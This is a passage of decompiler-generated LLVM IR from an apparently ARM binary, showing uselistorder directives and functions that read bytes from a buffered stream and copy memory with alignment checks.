  uselistorder i32 %v0_1386c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13814, { 1, 0 }
  uselistorder i32 %v5_137d4, { 1, 0, 2 }
  uselistorder i32 %v2_137d4, { 1, 0, 2 }
  uselistorder i32 %v2_13798, { 1, 0, 2 }
  uselistorder i32 %v0_13794, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_13790, { 1, 0, 2, 3 }
  uselistorder i32 %v3_13788, { 1, 0 }
  uselistorder i32 %v2_137c4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_13758, { 1, 0 }
  uselistorder i32 %v5_13714, { 1, 0 }
  uselistorder i32 %v1_13634.v0_136205, { 1, 0 }
  uselistorder i32 %v3_136f0, { 1, 0 }
  uselistorder i32 %v0_136cc, { 3, 2, 1, 0 }
  uselistorder i32 %v2_136b4, { 2, 1, 0 }
  uselistorder i32 %v0_13698, { 2, 3, 1, 0 }
  uselistorder i32 %v0_135b8, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp182, { 0, 1, 2, 5, 4, 3, 7, 6, 8 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 10, 0, 11, 1, 2, 3, 4, 5, 6, 8, 9, 7 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 18, 19, 21, 22, 23, 24, 25, 27, 41, 28, 32, 29, 30, 31, 33, 26, 34, 35, 36, 37, 38, 39, 40, 63, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 17, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 34, 33, 35, 36, 37, 40, 38, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 13, 15, 11, 16, 14, 17, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 9, 10, 40, 39, 38, 41, 11, 12, 37, 13, 14, 42, 16, 15, 17, 18, 19, 2, 20, 22, 21, 23, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 3, 34, 35, 1, 36, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 ()* @function_ca74, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @function_cba0, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 9, 0, 10, 3, 1, 11, 4, 5, 6, 7, 8 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1848c, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 96, { 3, 4, 1, 2, 0 }
  uselistorder i32 (i32)* @function_1845c, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_18170, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_18444, { 2, 1, 0 }
  uselistorder i8 32, { 0, 1, 2, 3, 4, 7, 6, 8, 5, 11, 10, 9, 12, 13 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), { 1, 3, 2, 0, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_13d40, { 1, 0 }
  uselistorder label %dec_label_pc_13cf8, { 2, 0, 1 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %dec_label_pc_13c58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13bd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ba0, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_13b78, { 1, 0 }
  uselistorder label %dec_label_pc_13b4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13af8, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a40, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13a30, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %.thread142, { 1, 0 }
  uselistorder label %._crit_edge91, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %dec_label_pc_13958, { 2, 1, 0 }
  uselistorder label %bb216, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13864, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_13814, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1380c, { 1, 0 }
  uselistorder label %bb208, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_136f0, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_1360c, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
}

define i32 @function_13d78(i32 %arg1) local_unnamed_addr {
dec_label_pc_13d78:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13d78 = load i32, i32* @r4, align 4
  store i32 %v3_13d78, i32* %stack_var_-16, align 4
  %v6_13d78 = load i32, i32* @r5, align 4
  %v12_13d78 = load i32, i32* @lr, align 4
  %v1_13d7c = add i32 %arg1, 52
  %v2_13d7c = inttoptr i32 %v1_13d7c to i32*
  %v3_13d7c = load i32, i32* %v2_13d7c, align 4
  %v2_13d84 = icmp eq i32 %v3_13d7c, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 142044, i32* %r6.global-to-local, align 4
  br i1 %v2_13d84, label %dec_label_pc_13dbc, label %dec_label_pc_13d98

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d78
  %v1_13d98 = add i32 %arg1, 16
  %v2_13d98 = inttoptr i32 %v1_13d98 to i32*
  %v3_13d98 = load i32, i32* %v2_13d98, align 4
  %v1_13d9c = add i32 %arg1, 24
  %v2_13d9c = inttoptr i32 %v1_13d9c to i32*
  %v3_13d9c = load i32, i32* %v2_13d9c, align 4
  %v3_13da0 = icmp ult i32 %v3_13d98, %v3_13d9c
  br i1 %v3_13da0, label %.thread, label %dec_label_pc_13db0

.thread:                                          ; preds = %dec_label_pc_13d98
  %v2_13da4 = inttoptr i32 %v3_13d98 to i8*
  %v3_13da4 = load i8, i8* %v2_13da4, align 1
  %v4_13da4 = zext i8 %v3_13da4 to i32
  store i32 %v4_13da4, i32* %r4.global-to-local, align 4
  %v6_13da4 = add i32 %v3_13d98, 1
  store i32 %v6_13da4, i32* %v2_13d98, align 4
  br label %dec_label_pc_13e30

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13d98
  %v1_13db0 = inttoptr i32 %arg1 to i16*
  %v2_13db0 = call i32 @function_13e54(i16* %v1_13db0)
  store i32 %v2_13db0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e30

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13d78
  %v1_13dc0 = add i32 %arg1, 56
  store i32 %v1_13dc0, i32* @r4, align 4
  %v4_13dd4 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_13dd4)
  %v0_13de8 = load i32, i32* %r6.global-to-local, align 4
  %v2_13de8 = add i32 %v0_13de8, 16
  %v3_13de8 = inttoptr i32 %v2_13de8 to i32*
  %v4_13de8 = load i32, i32* %v3_13de8, align 4
  store i32 81396, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13de8)
  %v0_13df4 = load i32, i32* @r5, align 4
  %v1_13df4 = add i32 %v0_13df4, 16
  %v2_13df4 = inttoptr i32 %v1_13df4 to i32*
  %v3_13df4 = load i32, i32* %v2_13df4, align 4
  %v1_13df8 = add i32 %v0_13df4, 24
  %v2_13df8 = inttoptr i32 %v1_13df8 to i32*
  %v3_13df8 = load i32, i32* %v2_13df8, align 4
  %v3_13dfc = icmp ult i32 %v3_13df4, %v3_13df8
  br i1 %v3_13dfc, label %.thread2, label %dec_label_pc_13e0c

.thread2:                                         ; preds = %dec_label_pc_13dbc
  %v2_13e00 = inttoptr i32 %v3_13df4 to i8*
  %v3_13e00 = load i8, i8* %v2_13e00, align 1
  %v4_13e00 = zext i8 %v3_13e00 to i32
  store i32 %v4_13e00, i32* %r4.global-to-local, align 4
  %v6_13e00 = add i32 %v3_13df4, 1
  store i32 %v6_13e00, i32* %v2_13df4, align 4
  br label %dec_label_pc_13e18

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13dbc
  %v1_13e10 = inttoptr i32 %v0_13df4 to i16*
  %v2_13e10 = call i32 @function_13e54(i16* %v1_13e10)
  store i32 %v2_13e10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e18

dec_label_pc_13e18:                               ; preds = %.thread2, %dec_label_pc_13e0c
  %v0_13e24 = load i32, i32* %r6.global-to-local, align 4
  %v2_13e24 = add i32 %v0_13e24, 24
  %v3_13e24 = inttoptr i32 %v2_13e24 to i32*
  %v4_13e24 = load i32, i32* %v3_13e24, align 4
  store i32 %v4_13e24, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_13e24)
  br label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %.thread, %dec_label_pc_13db0, %dec_label_pc_13e18
  %v0_13e30 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13e38, i32* @r4, align 4
  store i32 %v6_13d78, i32* @r5, align 4
  store i32 %v12_13d78, i32* @lr, align 4
  ret i32 %v0_13e30

; uselistorder directives
  uselistorder i32 %v3_13df4, { 1, 0, 2 }
  uselistorder i32 %v3_13d98, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 5, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_13e30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e18, { 1, 0 }
}

define i32 @function_13e44(i32 %arg1) local_unnamed_addr {
dec_label_pc_13e44:
  %v0_13e44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13e44, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13e44
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13e44, %bb
  %v10_13e50 = phi i32 [ %arg1, %dec_label_pc_13e44 ], [ 0, %bb ]
  ret i32 %v10_13e50

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13e54(i16* %arg1) local_unnamed_addr {
dec_label_pc_13e54:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_13e54 = load i32, i32* @r4, align 4
  store i32 %v3_13e54, i32* %stack_var_-12, align 4
  %v6_13e54 = load i32, i32* @r5, align 4
  %v9_13e54 = load i32, i32* @lr, align 4
  %v0_13e58 = load i32, i32* @r0, align 4
  %v1_13e58 = add i32 %v0_13e58, 16
  %v2_13e58 = inttoptr i32 %v1_13e58 to i32*
  %v3_13e58 = load i32, i32* %v2_13e58, align 4
  store i32 %v3_13e58, i32* %r2.global-to-local, align 4
  %v1_13e5c = add i32 %v0_13e58, 24
  %v2_13e5c = inttoptr i32 %v1_13e5c to i32*
  %v3_13e5c = load i32, i32* %v2_13e5c, align 4
  %v3_13e60 = icmp ult i32 %v3_13e58, %v3_13e5c
  store i32 %v0_13e58, i32* @r4, align 4
  br i1 %v3_13e60, label %bb, label %dec_label_pc_13e80

bb:                                               ; preds = %dec_label_pc_13e54
  %v2_13e6c = inttoptr i32 %v3_13e58 to i8*
  %v3_13e6c = load i8, i8* %v2_13e6c, align 1
  %v4_13e6c = zext i8 %v3_13e6c to i32
  store i32 %v4_13e6c, i32* %r0.global-to-local, align 4
  %v6_13e6c = add i32 %v3_13e58, 1
  store i32 %v6_13e6c, i32* %r2.global-to-local, align 4
  store i32 %v6_13e6c, i32* %v2_13e58, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e54
  store i32 142044, i32* @r5, align 4
  %v1_13e80 = inttoptr i32 %v0_13e58 to i16*
  %v2_13e80 = load i16, i16* %v1_13e80, align 2
  %v3_13e80 = zext i16 %v2_13e80 to i32
  %v1_13e84 = and i32 %v3_13e80, 131
  %tmp24 = icmp ugt i32 %v1_13e84, 128
  br i1 %tmp24, label %dec_label_pc_13ea0, label %dec_label_pc_13e90

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13e80
  store i32 128, i32* @r1, align 4
  %v0_13e94 = call i32 @function_15a78()
  store i32 %v0_13e94, i32* %r0.global-to-local, align 4
  %v2_13e98 = icmp eq i32 %v0_13e94, 0
  br i1 %v2_13e98, label %dec_label_pc_13e90.dec_label_pc_13ea0_crit_edge, label %dec_label_pc_13f68

dec_label_pc_13e90.dec_label_pc_13ea0_crit_edge:  ; preds = %dec_label_pc_13e90
  %v0_13ea0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e90.dec_label_pc_13ea0_crit_edge, %dec_label_pc_13e80
  %v2_13ee0 = phi i32 [ %v0_13ea0.pre, %dec_label_pc_13e90.dec_label_pc_13ea0_crit_edge ], [ %v0_13e58, %dec_label_pc_13e80 ]
  %v1_13ea0 = inttoptr i32 %v2_13ee0 to i16*
  %v2_13ea0 = load i16, i16* %v1_13ea0, align 2
  %v3_13ea0 = zext i16 %v2_13ea0 to i32
  store i32 %v3_13ea0, i32* %r2.global-to-local, align 4
  %v1_13ea4 = and i32 %v3_13ea0, 2
  %v2_13ea4 = icmp eq i32 %v1_13ea4, 0
  br i1 %v2_13ea4, label %dec_label_pc_13ed0, label %dec_label_pc_13eac

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13ea0
  %tmp25 = urem i16 %v2_13ea0, 2
  %v1_13eac = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_13eac
  %v4_13eb0 = and i32 %tmp21, 4
  %v5_13eb0 = add i32 %v4_13eb0, %v2_13ee0
  %v1_13eb4 = add i32 %v5_13eb0, 36
  %v2_13eb4 = inttoptr i32 %v1_13eb4 to i8*
  %v3_13eb4 = load i8, i8* %v2_13eb4, align 1
  %v4_13eb4 = zext i8 %v3_13eb4 to i32
  %v1_13eb8 = add nsw i32 %v3_13ea0, -1
  store i32 %v1_13eb8, i32* %r2.global-to-local, align 4
  store i32 %v4_13eb4, i32* %r0.global-to-local, align 4
  %v2_13ec4 = add i32 %v2_13ee0, 40
  %v3_13ec4 = inttoptr i32 %v2_13ec4 to i32*
  store i32 0, i32* %v3_13ec4, align 4
  %v0_13ec8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec8 = trunc i32 %v0_13ec8 to i16
  %v2_13ec8 = load i32, i32* @r4, align 4
  %v3_13ec8 = inttoptr i32 %v2_13ec8 to i16*
  store i16 %v1_13ec8, i16* %v3_13ec8, align 2
  br label %dec_label_pc_13f6c

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13ea0
  %v1_13ed0 = add i32 %v2_13ee0, 16
  %v1_13ed4 = inttoptr i32 %v1_13ed0 to i32*
  %v2_13ed4 = load i32, i32* %v1_13ed4, align 4
  %v3_13ed4 = add i32 %v2_13ee0, 20
  %v4_13ed4 = inttoptr i32 %v3_13ed4 to i32*
  %v5_13ed4 = load i32, i32* %v4_13ed4, align 4
  %v9_13ed8 = icmp eq i32 %v5_13ed4, %v2_13ed4
  br i1 %v9_13ed8, label %dec_label_pc_13ee8, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13ed0
  %v2_13edc = inttoptr i32 %v2_13ed4 to i8*
  %v3_13edc = load i8, i8* %v2_13edc, align 1
  %v4_13edc = zext i8 %v3_13edc to i32
  store i32 %v4_13edc, i32* %r0.global-to-local, align 4
  %v6_13edc = add i32 %v2_13ed4, 1
  store i32 %v6_13edc, i32* %v1_13ed4, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ed0
  %v1_13ee8 = add i32 %v2_13ee0, 4
  %v2_13ee8 = inttoptr i32 %v1_13ee8 to i32*
  %v3_13ee8 = load i32, i32* %v2_13ee8, align 4
  %v7_13eec = icmp eq i32 %v3_13ee8, -2
  br i1 %v7_13eec, label %.thread8, label %dec_label_pc_13f00

.thread8:                                         ; preds = %dec_label_pc_13ee8
  %v2_13ef0 = or i16 %v2_13ea0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_13ef0, i16* %v1_13ea0, align 2
  br label %dec_label_pc_13f6c

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13ee8
  %v1_13f00 = and i32 %v3_13ea0, 768
  %v2_13f00 = icmp eq i32 %v1_13f00, 0
  br i1 %v2_13f00, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_13f00
  %v1_13f08 = load i32, i32* @r5, align 4
  %v3_13f08 = add i32 %v1_13f08, 48
  %v4_13f08 = inttoptr i32 %v3_13f08 to i32*
  %v5_13f08 = load i32, i32* %v4_13f08, align 4
  store i32 %v5_13f08, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_13f00, %bb22
  %v1_13f0c = xor i1 %v2_13f00, true
  call void @__pseudo_cond_branch(i1 %v1_13f0c, i32 ptrtoint (i32* @global_var_ed9c.255 to i32))
  %v0_13f10 = load i32, i32* @r4, align 4
  %v1_13f10 = add i32 %v0_13f10, 8
  store i32 %v1_13f10, i32* %r2.global-to-local, align 4
  %v1_13f14 = inttoptr i32 %v1_13f10 to i32*
  %v2_13f14 = load i32, i32* %v1_13f14, align 4
  store i32 %v2_13f14, i32* %r2.global-to-local, align 4
  %v3_13f14 = add i32 %v0_13f10, 12
  %v4_13f14 = inttoptr i32 %v3_13f14 to i32*
  %v5_13f14 = load i32, i32* %v4_13f14, align 4
  %v9_13f18 = icmp eq i32 %v5_13f14, %v2_13f14
  br i1 %v9_13f18, label %dec_label_pc_13f4c, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %.thread10
  %v2_13f20 = add i32 %v0_13f10, 24
  %v3_13f20 = inttoptr i32 %v2_13f20 to i32*
  store i32 %v2_13f14, i32* %v3_13f20, align 4
  %v0_13f24 = load i32, i32* @r4, align 4
  store i32 %v0_13f24, i32* %r0.global-to-local, align 4
  %v2_13f28 = call i32 @function_15a48(i32 %v0_13f24)
  store i32 %v2_13f28, i32* %r0.global-to-local, align 4
  %v2_13f2c = icmp eq i32 %v2_13f28, 0
  br i1 %v2_13f2c, label %dec_label_pc_13f68, label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f20
  %v0_13f34 = load i32, i32* @r4, align 4
  %v1_13f34 = add i32 %v0_13f34, 20
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  %v2_13f38 = add i32 %v0_13f34, 24
  %v3_13f38 = inttoptr i32 %v2_13f38 to i32*
  store i32 %v3_13f34, i32* %v3_13f38, align 4
  %v0_13f3c = load i32, i32* @r4, align 4
  %v1_13f3c = add i32 %v0_13f3c, 16
  %v2_13f3c = inttoptr i32 %v1_13f3c to i32*
  %v3_13f3c = load i32, i32* %v2_13f3c, align 4
  %v1_13f40 = inttoptr i32 %v3_13f3c to i8*
  %v2_13f40 = load i8, i8* %v1_13f40, align 1
  %v3_13f40 = zext i8 %v2_13f40 to i32
  store i32 %v3_13f40, i32* %r0.global-to-local, align 4
  %v5_13f40 = add i32 %v3_13f3c, 1
  store i32 %v5_13f40, i32* %v2_13f3c, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f4c:                               ; preds = %.thread10
  %v1_13f4c = inttoptr i32 %v0_13f10 to i16*
  store i32 %v0_13f10, i32* %r0.global-to-local, align 4
  %v2_13f50 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_13f58 = call i32 @function_1592c(i16* %v1_13f4c, i32 %v2_13f50, i32 1)
  store i32 %v5_13f58, i32* %r0.global-to-local, align 4
  %v2_13f5c = icmp eq i32 %v5_13f58, 0
  br i1 %v2_13f5c, label %dec_label_pc_13f68, label %bb23

bb23:                                             ; preds = %dec_label_pc_13f4c
  %v4_13f60 = load i8, i8* %stack_var_-17, align 1
  %v5_13f60 = sext i8 %v4_13f60 to i32
  store i32 %v5_13f60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f4c, %dec_label_pc_13e90, %dec_label_pc_13f20
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_13f34, %dec_label_pc_13eac, %dec_label_pc_13f68
  %v2_13f70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13f70, i32* @r4, align 4
  store i32 %v6_13e54, i32* @r5, align 4
  store i32 %v9_13e54, i32* @lr, align 4
  %v1_13f74 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13f74

; uselistorder directives
  uselistorder i32 %v2_13ed4, { 1, 0, 2 }
  uselistorder i32 %v2_13ee0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_13e58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13e58, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 3, 4, 2, 5, 6, 1, 7, 8, 9, 10, 11, 0, 13 }
  uselistorder label %dec_label_pc_13f6c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_13f68, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_13f80(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13f80:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_13f80 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f80 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f80 = sub i32 %v0_13f80, %v1_13f80
  %v3_13f80 = icmp ult i32 %v0_13f80, %v1_13f80
  %v4_13f80 = xor i32 %v1_13f80, %v0_13f80
  %v5_13f80 = xor i32 %v2_13f80, %v0_13f80
  %v6_13f80 = and i32 %v5_13f80, %v4_13f80
  %v7_13f80 = icmp slt i32 %v6_13f80, 0
  store i1 %v7_13f80, i1* %cpsr_v.global-to-local, align 1
  %v8_13f80 = icmp slt i32 %v2_13f80, 0
  store i1 %v8_13f80, i1* %cpsr_n.global-to-local, align 1
  %v9_13f80 = icmp eq i32 %v0_13f80, %v1_13f80
  store i1 %v9_13f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f80, label %dec_label_pc_141d4, label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f80
  br i1 %v9_13f80, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_13f88
  %merge = phi i32 [ %v0_13f80, %dec_label_pc_13f88 ], [ %v2_14268, %bb150 ], [ %v11_14284, %bb153 ], [ %v7_14284, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13f88
  %v5_13f8c = inttoptr i32 %v1_13f80 to i8*
  store i8* %v5_13f8c, i8** %stack_var_-8, align 4
  %v8_13f8c = load i32, i32* @lr, align 4
  %v0_13f90 = load i32, i32* @r2, align 4
  %v2_13f90 = add i32 %v0_13f90, -4
  store i32 %v2_13f90, i32* %r2.global-to-local, align 4
  %v4_13f90 = sub i32 3, %v0_13f90
  %v5_13f90 = and i32 %v4_13f90, %v0_13f90
  %v6_13f90 = icmp slt i32 %v5_13f90, 0
  store i1 %v6_13f90, i1* %cpsr_v.global-to-local, align 1
  %v7_13f90 = icmp slt i32 %v2_13f90, 0
  store i1 %v7_13f90, i1* %cpsr_n.global-to-local, align 1
  %v8_13f90 = icmp eq i32 %v0_13f90, 4
  store i1 %v8_13f90, i1* %cpsr_z.global-to-local, align 1
  %v5_13f94 = icmp slt i32 %v0_13f90, 4
  br i1 %v5_13f94, label %bb140, label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %bb
  %v1_13f98 = urem i32 %v1_13f80, 4
  store i32 %v1_13f98, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13f98 = icmp eq i32 %v1_13f98, 0
  store i1 %v2_13f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f98, label %dec_label_pc_13fa0, label %dec_label_pc_1404c

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f98
  %v1_13fa0 = urem i32 %v0_13f80, 4
  store i32 %v1_13fa0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13fa0 = icmp eq i32 %v1_13fa0, 0
  store i1 %v2_13fa0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_13f80 to i2
  br i1 %v2_13fa0, label %dec_label_pc_13fa8, label %dec_label_pc_1407c

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13fa0, %dec_label_pc_14074
  %v0_13fc093 = phi i32 [ %v1_13f80, %dec_label_pc_13fa0 ], [ %v0_1419c76, %dec_label_pc_14074 ]
  %v0_13fbc92 = phi i32 [ %v0_13f80, %dec_label_pc_13fa0 ], [ %v0_14074, %dec_label_pc_14074 ]
  %v0_13fa8 = phi i32 [ %v2_13f90, %dec_label_pc_13fa0 ], [ %v2_1406c, %dec_label_pc_14074 ]
  %v1_13fa8 = add i32 %v0_13fa8, -8
  store i32 %v1_13fa8, i32* %r2.global-to-local, align 4
  %v3_13fa8 = sub i32 7, %v0_13fa8
  %v4_13fa8 = and i32 %v3_13fa8, %v0_13fa8
  %v5_13fa8 = icmp slt i32 %v4_13fa8, 0
  store i1 %v5_13fa8, i1* %cpsr_v.global-to-local, align 1
  %v6_13fa8 = icmp slt i32 %v1_13fa8, 0
  store i1 %v6_13fa8, i1* %cpsr_n.global-to-local, align 1
  %v7_13fa8 = icmp eq i32 %v0_13fa8, 8
  store i1 %v7_13fa8, i1* %cpsr_z.global-to-local, align 1
  %v2_13fac = xor i1 %v6_13fa8, %v5_13fa8
  br i1 %v2_13fac, label %dec_label_pc_13ffc, label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13fa8
  %v1_13fb0 = add i32 %v0_13fa8, -28
